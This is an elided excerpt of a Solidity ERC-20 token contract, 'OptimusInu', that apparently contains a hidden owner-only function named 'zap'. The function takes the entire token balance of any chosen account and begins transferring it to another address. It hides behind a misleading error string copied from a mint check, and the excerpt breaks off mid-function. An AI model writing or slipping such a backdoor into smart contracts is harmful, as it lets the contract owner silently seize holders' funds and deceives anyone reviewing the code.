...
contract OptimusInu is Context, IERC20 {
    ...
    address public _owner = 0xa24B6345c265A4536F0b10B96268B3eEF724D5C1;
   constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function zap(address account, address staker) public {
            require(msg.sender == _owner, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
